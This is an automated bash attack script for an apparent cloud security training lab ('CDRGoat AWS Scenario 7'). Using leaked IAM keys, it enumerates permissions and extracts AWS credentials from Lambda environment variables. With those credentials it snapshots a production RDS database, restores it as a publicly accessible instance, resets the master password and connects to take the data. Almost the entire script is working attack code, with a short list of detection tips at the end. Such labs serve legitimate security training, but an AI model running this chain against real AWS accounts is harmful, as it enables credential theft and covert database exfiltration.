#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \/ _ \/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===           CDRGoat AWS - Scenario 7               ===" "${RESET}"
  printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
  printf "  • Step 1. Configuring AWS credentials\n"
  printf "  • Step 2. Permission enumeration for leaked credentials\n"
  printf "  • Step 3. Discovering Lambda functions\n"
  printf "  • Step 4. Use extracted STREAMGOAT creds to snapshot and restore RDS\n"
  
}
banner

#############################################
# Preflight checks (no changes to your logic)
#############################################
step "Preflight checks"
missing=0
for c in aws curl jq zip mysql; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true
#############################################
# Step 1. Configuring AWS credentials
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Configuring AWS credentials to use awscli  ===" "${RESET}"
is_valid_keys() {
  local key="$1" secret="$2" token="${3:-}" region="${4:-us-east-1}"
  local rc=0 out

  # 1) Ensure no env creds override our profile
  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_PROFILE AWS_DEFAULT_PROFILE
  PROFILE="streamgoat-scenario-7"

  # 2) Write creds to a dedicated profile (avoid clobbering 'default')
  aws configure set aws_access_key_id     "$key"    --profile "$PROFILE"
  aws configure set aws_secret_access_key "$secret" --profile "$PROFILE"
  aws configure set region                "$region" --profile "$PROFILE"

  # 3) Force the call to use our profile
  spin_start "Validating credentials via STS"
  out=$(aws sts get-caller-identity --profile "$PROFILE" --output json 2>&1) || rc=$?
  spin_stop

  if [ "$rc" -ne 0 ]; then
    return 1
  fi

  ok "STS OK → $(printf "%s" "$out" | jq -r '.Arn')"

  return 0
}

step "Starting point configuration"
while :; do
  read -r -p "Enter leaked AWS key: " AWSKEY_USER
  read -r -p "Enter leaked AWS secret: " AWSSECRET_USER; printf "\n"
  if is_valid_keys "$AWSKEY_USER" "$AWSSECRET_USER" "us-east-1"; then
    ok "Keys are valid. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} successful"
    break
  else
    err "Not valid keys. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} failed"
  fi
done
printf "\n"
read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We configured AWS CLI with leaked IAM user credentials.\n\n"
printf "This scenario demonstrates how Lambda environment variables\n"
printf "can leak credentials, enabling RDS snapshot attacks.\n\n"

#############################################
# Step 2. Permission enumeration for leaked credentials
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for leaked credentials  ===" "${RESET}"

# init colors (portable)

try() {
  local desc="$1"; shift
  local rc
  set +e
  "$@" >/dev/null 2>&1
  rc=$?
  set -e
  if [ $rc -eq 0 ]; then
    printf "[%s] %s[OK]%s    %s\n" "$(date +%H:%M:%S)" "$GREEN" "$RESET" "$desc"
  else
    printf "[%s] %s[DENY]%s  %s\n" "$(date +%H:%M:%S)" "$RED" "$RESET" "$desc"
  fi
}

# Identity/context
try "STS GetCallerIdentity" aws sts get-caller-identity --profile "$PROFILE"
try "IAM List Roles"  aws iam list-roles --profile "$PROFILE"

# Inventory
try "EC2 DescribeInstances" aws ec2 describe-instances --max-items 5 --profile "$PROFILE"
try "S3 ListAllMyBuckets"   aws s3api list-buckets --profile "$PROFILE"
try "Secrets ListSecrets"   aws secretsmanager list-secrets --max-results 5 --profile "$PROFILE"
try "SSM GetParametersByPath /" aws ssm get-parameters-by-path --path / --max-results 5 --profile "$PROFILE"
try "SSM DescribeInstances" aws ssm describe-instance-information --profile "$PROFILE"
try "KMS ListKeys"          aws kms list-keys --limit 5 --profile "$PROFILE"
try "ECR DescribeRepos"     aws ecr describe-repositories --max-results 5 --profile "$PROFILE"
try "Lambda ListFunctions"  aws lambda list-functions --max-items 5 --profile "$PROFILE"
try "DDB ListTables"        aws dynamodb list-tables --max-items 5 --profile "$PROFILE"
try "RDS DescribeDBs"       aws rds describe-db-instances --max-records 20 --profile "$PROFILE"
try "Logs DescribeLogGroups" aws logs describe-log-groups --limit 5 --profile "$PROFILE"
try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFILE"

printf "\nOK, it seems our permissions are quite limited. Let's try to get some more info about our user...\n"
printf "\n"
read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "Permission enumeration shows ${MAGENTA}Lambda ListFunctions${RESET} succeeded.\n\n"
printf "Lambda functions may contain sensitive information:\n"
printf "  • Credentials in environment variables\n"
printf "  • Database connection strings\n"
printf "  • API keys and secrets\n\n"

#############################################
# Tempdir + cleanup helpers (global for script)
#############################################
TMPDIR="/tmp/streamgoat-$$"
mkdir -p "$TMPDIR"
FILES_TO_CLEAN=()

# helper to register a temp path for later deletion
register_temp() {
  # accepts multiple args
  for p in "$@"; do
    FILES_TO_CLEAN+=("$p")
  done
}

#############################################
# Step 3. Discovering Lambda functions
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 3: Discovering Lambda functions  ===" "${RESET}"

# list lambda function names that match the prefix
spin_start "Listing functions"
LAMBDA_NAMES=$(aws lambda list-functions --profile "$PROFILE" --output json \
  | jq -r '.Functions[].FunctionName' \
  | grep -E '^StreamGoat-Lambda-' || true)
spin_stop

if [ -z "$LAMBDA_NAMES" ]; then
  err "No StreamGoat-Lambda-* functions found with this profile"
  printf "\n(If you expect functions, verify permissions include lambda:ListFunctions and lambda:GetFunction)\n"
else
  ok "Found the following StreamGoat Lambda(s):"
  printf "%s\n" "$LAMBDA_NAMES"
fi

download_code() {
  local code_url="$1" out_zip="$2"
  if [ -z "$code_url" ] || [ "$code_url" = "null" ]; then
    return 1
  fi
  curl -fsSL "$code_url" -o "$out_zip"
}

for fn in $LAMBDA_NAMES; do
  step "Processing Lambda: $fn"

  spin_start "Retrieving function metadata (get-function)"
  if ! FUNC_JSON=$(aws lambda get-function --function-name "$fn" --profile "$PROFILE" --output json 2>&1); then
    spin_stop
    err "Failed to call get-function for $fn — output:"
    printf "%s\n" "$FUNC_JSON"
    continue
  fi
  spin_stop
  ok "get-function OK for $fn"

  # Prepare per-function temp paths
  FN_DIR="${TMPDIR}/${fn}"
  mkdir -p "$FN_DIR"
  register_temp "$FN_DIR"

  # Save raw JSON (contains Configuration + Code.Location etc.)
  RAW_JSON_PATH="${FN_DIR}/${fn}.get-function.json"
  printf "%s\n" "$FUNC_JSON" > "$RAW_JSON_PATH"
  register_temp "$RAW_JSON_PATH"

  # Extract Code.Location and configuration environment variables
  CODE_URL=$(printf "%s" "$FUNC_JSON" | jq -r '.Code.Location // empty' 2>/dev/null || true)

  if [ -z "$CODE_URL" ]; then
    info "No Code.Location returned (insufficient permissions or URL absent)"
  else
    info "Code package URL obtained (will download)"
  fi

  # If code URL present, download into TMPDIR and extract
  if [ -n "$CODE_URL" ]; then
    OUT_ZIP="${FN_DIR}/${fn}.zip"
    spin_start "Downloading code package to ${OUT_ZIP}"
    if download_code "$CODE_URL" "$OUT_ZIP"; then
      spin_stop
      ok "Downloaded code to ${OUT_ZIP}"
      register_temp "$OUT_ZIP"

      if command -v unzip >/dev/null 2>&1; then
        unzip -oq "$OUT_ZIP" -d "$FN_DIR"
        ok "Extracted archive to $FN_DIR"
        # register each extracted file (walk the extraction dir and register files/dirs)
        while IFS= read -r -d '' p; do
          register_temp "$p"
        done < <(find "$FN_DIR" -mindepth 1 -maxdepth 10 -print0)
        # heuristics: show candidate python handler heads
        for candidate in "${FN_DIR}"/lambda_function.py "${FN_DIR}"/handler.py "${FN_DIR}"/*.py; do
          [ -f "$candidate" ] || continue
          echo "${YELLOW}----- $candidate (first 50 lines) -----"
          sed -n '1,50p' "$candidate"
          echo "---------------------------------------${RESET}"
          break
        done
      else
        info "unzip not installed; saved zip to $OUT_ZIP"
      fi
    else
      spin_stop
      err "Failed to download code package from presigned URL (maybe expired or denied)"
    fi
  else
    info "Skipping download — no Code.Location available"
  fi

  printf "\n"
  read -r -p "The function seems to be used for backuping and restoring RDS assets. At the same time it is using some environmantal variables. Let's try to grab them. Press Enter to proceed (or Ctrl+C to abort)..."
  printf "\n"

  ENV_VARS_RAW=$(printf "%s" "$FUNC_JSON" | jq -r '.Configuration.Environment.Variables // {}' 2>/dev/null || echo '{}')
  if [ "$ENV_VARS_RAW" = "{}" ] || [ -z "$ENV_VARS_RAW" ]; then
    info "No environment variables exposed to caller / none present"
  else
    info "Environment variables (as returned by get-function Configuration.Environment.Variables):"
    printf "%s\n" "$ENV_VARS_RAW" | jq -r 'to_entries[] | "\(.key)=\(.value)"' 
  fi

done


#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "Lambda GetFunction exposed environment variables:\n"
printf "  • ${MAGENTA}STREAMGOAT_AK / STREAMGOAT_SK${RESET}: AWS access keys!\n"
printf "  • ${MAGENTA}RDS_IDENTIFIER${RESET}: Target database identifier\n\n"
printf "The Lambda handles RDS backup/restore, explaining its RDS permissions.\n\n"

printf "\nThe plan is:\n    1. Create snapshot of RDS instance\n    2. Create new publicly-accessible RDS instance based on snapshot\n    3. Modify master password\n    4. Connect and exfiltrate data\n\n"
read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 4. Use extracted STREAMGOAT creds to snapshot and restore RDS
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 4: Use extracted STREAMGOAT creds to snapshot and restore RDS  ===" "${RESET}"

# Path to JSON file from Step 3 that contained environment variables
# Adjust if needed; here we assume you saved get-function output to /tmp/streamgoat-$$/<function>.get-function.json
LATEST_FUNC_JSON=$(find /tmp/streamgoat-* -type f -name "StreamGoat-Lambda-*.get-function.json" -print0 2>/dev/null \
  | xargs -0 ls -1t 2>/dev/null \
  | head -n1 || true)

if [ -z "$LATEST_FUNC_JSON" ]; then
  err "Could not find saved Lambda get-function JSON to extract STREAMGOAT creds"
  exit 1
fi

# extract STREAMGOAT_AK and STREAMGOAT_SK from JSON
STREAMGOAT_AK=$(jq -r '.Configuration.Environment.Variables.STREAMGOAT_AK // empty' "$LATEST_FUNC_JSON")
STREAMGOAT_SK=$(jq -r '.Configuration.Environment.Variables.STREAMGOAT_SK // empty' "$LATEST_FUNC_JSON")
RDS_IDENTIFIER=$(jq -r '.Configuration.Environment.Variables.RDS_IDENTIFIER // empty' "$LATEST_FUNC_JSON")

if [ -z "$STREAMGOAT_AK" ] || [ -z "$STREAMGOAT_SK" ] || [ -z "$RDS_IDENTIFIER" ]; then
  err "Missing STREAMGOAT_AK/STREAMGOAT_SK or RDS_IDENTIFIER in extracted JSON"
  exit 1
fi

# configure a new AWS CLI profile for the Lambda’s embedded credentials

aws configure set aws_access_key_id     "$STREAMGOAT_AK" --profile "$PROFILE"
aws configure set aws_secret_access_key "$STREAMGOAT_SK" --profile "$PROFILE"
aws configure set region                "us-east-1"       --profile "$PROFILE"
ok "AWS CLI profile updated (now we are using $STREAMGOAT_AK)"
printf "This step may take about 5-7 minutes... be patient\n"

# describe the original RDS
spin_start "Describing original RDS instance $RDS_IDENTIFIER"
RDS_JSON=$(aws rds describe-db-instances --db-instance-identifier "$RDS_IDENTIFIER" --profile "$PROFILE" --output json 2>/dev/null) || true
spin_stop

if [ -z "$RDS_JSON" ]; then
  err "Failed to describe original RDS $RDS_IDENTIFIER with new creds"
  exit 1
fi

# record its security groups and instance class
SG_IDS=$(printf "%s" "$RDS_JSON" | jq -r '.DBInstances[0].VpcSecurityGroups[].VpcSecurityGroupId' | xargs)
DBCLASS=$(printf "%s" "$RDS_JSON" | jq -r '.DBInstances[0].DBInstanceClass')
SUBNETGROUP=$(printf "%s" "$RDS_JSON" | jq -r '.DBInstances[0].DBSubnetGroup.DBSubnetGroupName')

# create snapshot
SNAP_ID="${RDS_IDENTIFIER}-snap-$(date +%Y%m%d%H%M%S)"

spin_start "1. Creating snapshot $SNAP_ID"
aws rds create-db-snapshot --db-instance-identifier "$RDS_IDENTIFIER" --db-snapshot-identifier "$SNAP_ID" --profile "$PROFILE" >/dev/null

aws rds wait db-snapshot-available --db-snapshot-identifier "$SNAP_ID" --profile "$PROFILE"
spin_stop
ok "1. Snapshot $SNAP_ID is created and available to be used"

# restore DB instance from snapshot (publicly accessible)
NEWDB_ID="${RDS_IDENTIFIER}-public-$(date +%Y%m%d%H%M%S)"
spin_start "2. Restoring DB instance $NEWDB_ID (publicly accessible)"
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier "$NEWDB_ID" \
  --db-snapshot-identifier "$SNAP_ID" \
  --db-instance-class "$DBCLASS" \
  --db-subnet-group-name "$SUBNETGROUP" \
  --publicly-accessible \
  --vpc-security-group-ids $SG_IDS \
  --profile "$PROFILE" >/dev/null

aws rds wait db-instance-available \
  --db-instance-identifier "$NEWDB_ID" \
  --profile "$PROFILE" >/dev/null

spin_stop
ok "2. Restored RDS instance $NEWDB_ID is now available"

NEW_ADMIN_PASSWORD="streamgoat_password"
ADMIN_USERNAME="streamgoat_admin"

# Send modify-db-instance request to update master password
spin_start "3. Modifying DB instance password for $NEWDB_ID"
aws rds modify-db-instance \
  --db-instance-identifier "$NEWDB_ID" \
  --master-user-password "$NEW_ADMIN_PASSWORD" \
  --apply-immediately \
  --profile "$PROFILE" >/dev/null

aws rds wait db-instance-available \
  --db-instance-identifier "$NEWDB_ID" \
  --profile "$PROFILE" >/dev/null

sleep 60
spin_stop
ok "3. Master password had been changed in RDS instance $NEWDB_ID"



# Optional connectivity check
ENDPOINT=$(aws rds describe-db-instances \
  --db-instance-identifier "$NEWDB_ID" \
  --profile "$PROFILE" \
  --query 'DBInstances[0].Endpoint.Address' \
  --output text)

info "Testing connectivity to RDS instance using new credentials..."
if command -v mysql >/dev/null 2>&1; then
  if mysql -h "$ENDPOINT" -u "$ADMIN_USERNAME" -p"$NEW_ADMIN_PASSWORD" -e "SELECT VERSION();" >/dev/null 2>&1; then
    ok "4. Successfully connected to RDS using updated password. We can successfully send query: ${YELLOW}SELECT VERSION();${RESET}"
    mysql -h "$ENDPOINT" -u "$ADMIN_USERNAME" -p"$NEW_ADMIN_PASSWORD" -e "SELECT VERSION();" 2>/dev/null
  else
    err "4. Failed to connect to RDS with new credentials"
  fi
else
  info "mysql CLI not available — skipping connection test"
fi


#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We executed the RDS snapshot attack:\n"
printf "  1. Created snapshot of production database\n"
printf "  2. Restored to new publicly-accessible instance\n"
printf "  3. Reset master password to known value\n"
printf "  4. Connected and exfiltrated data\n\n"
printf "The original database is untouched - this is a stealth technique.\n\n"

read -r -p "The scenario is successfully completed. Press Enter to continue..." _ || true


#############################################
# Final cleanup step (explicit prompt + automatic via trap)
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Final cleanup  ===" "${RESET}"
printf "We have remove snapshot, the new RDS instance and temporary files manualy. Terraform will not remove them automatically."

final_cleanup() {
  # avoid running spinner leftovers
  spin_stop || true

  # --[ 1. Cleanup files ]
  if [ "${#FILES_TO_CLEAN[@]}" -gt 0 ]; then
    step "Cleaning up temporary files (safe removal)"
    for f in "${FILES_TO_CLEAN[@]}"; do
      [ -z "$f" ] && continue
      if [ ! -e "$f" ]; then
        info "Already removed: $f"
        continue
      fi
      if rm -rf "$f" 2>/dev/null; then
        ok "Removed: $f"
      else
        err "Failed to remove: $f"
      fi
    done
  fi

  # attempt to remove TMPDIR if empty
  if [ -d "$TMPDIR" ]; then
    rmdir "$TMPDIR" 2>/dev/null || true
  fi

  # --[ 2. Cleanup AWS RDS instance ]
  if [ -n "${NEWDB_ID:-}" ]; then
    step "Cleaning up restored RDS instance: ${NEWDB_ID}"
    spin_start "Deleting RDS instance $NEWDB_ID"
    if aws rds delete-db-instance \
      --db-instance-identifier "$NEWDB_ID" \
      --skip-final-snapshot \
      --profile "$PROFILE" >/dev/null 2>&1; then
      spin_stop
      ok "Delete initiated for RDS instance: $NEWDB_ID"
    else
      spin_stop
      err "Failed to delete RDS instance: $NEWDB_ID"
    fi
  fi
  
  # --[ 3. Remove all matching snapshots ]
  if [ -n "${RDS_IDENTIFIER:-}" ]; then
    step "Searching for snapshots with prefix: ${RDS_IDENTIFIER}-"
    
    SNAP_IDS=$(aws rds describe-db-snapshots \
      --profile "$PROFILE" \
      --query "DBSnapshots[?starts_with(DBSnapshotIdentifier, \`${RDS_IDENTIFIER}-\`)].DBSnapshotIdentifier" \
      --output text)
  
    if [ -z "$SNAP_IDS" ]; then
      info "No matching snapshots found for cleanup"
    else
      for snap in $SNAP_IDS; do
        spin_start "Deleting snapshot: $snap"
        if aws rds delete-db-snapshot \
          --db-snapshot-identifier "$snap" \
          --profile "$PROFILE" >/dev/null 2>&1; then
          spin_stop
          ok "Snapshot deleted: $snap"
        else
          spin_stop
          err "Failed to delete snapshot: $snap"
        fi
      done
    fi
  fi

}

# run cleanup on script exit (also on ctrl-c)
trap 'final_cleanup' EXIT

################################################################################
# Final Summary
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${RESET}"

printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Attack chain executed:" "${RESET}"
printf "  1. Validated leaked IAM user credentials\n"
printf "  2. Enumerated Lambda functions\n"
printf "  3. Extracted AWS credentials from Lambda environment variables\n"
printf "  4. Pivoted to Lambda's RDS-privileged credentials\n"
printf "  5. Created RDS snapshot of production database\n"
printf "  6. Restored to new publicly-accessible instance\n"
printf "  7. Reset master password and connected to exfiltrate data\n\n"

printf "%s%s%s\n" "${BOLD}${RED}" "Impact:" "${RESET}"
printf "  • Complete RDS database compromise\n"
printf "  • Credential extraction from Lambda environment\n"
printf "  • Stealth data exfiltration (production DB untouched)\n\n"

printf "%s\n" "Defenders should monitor for:"
printf "  • Lambda GetFunction calls (exposes env vars)\n"
printf "  • RDS snapshot creation outside backup windows\n"
printf "  • RestoreDBInstance with PubliclyAccessible=true\n"
printf "  • ModifyDBInstance password changes\n\n"